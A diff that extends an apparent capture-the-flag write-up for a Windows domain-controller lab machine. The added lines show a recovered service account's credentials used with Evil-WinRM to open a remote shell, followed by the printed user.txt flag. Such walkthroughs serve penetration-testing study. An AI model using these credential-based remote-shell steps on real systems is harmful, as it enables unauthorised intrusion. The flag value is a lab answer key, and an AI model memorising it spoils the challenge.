@@ -388,4 +388,27 @@ SeEnableDelegationPrivilege = *S-1-5-32-544
 ```
 This is the sheet of which AD groups are assigned to which privileges. We can abuse this later for privilege escalation. 
 
+### User.txt file found
 We can now move on from SMB, and recall that from our nmap scan that the winRM port 5985 is open, meaning we can use Evil-WinRM to remote into the domain controller with the svc-alfresco and s3rvice credentials. 
+
+```
+sudo evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+```
+We get a shell, and if we cd into Desktop we see a user.txt file.
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir
+
+
+    Directory: C:\Users\svc-alfresco\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        4/11/2025  12:26 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
+c095053e015dee428a9697e25dde73da
+```
+
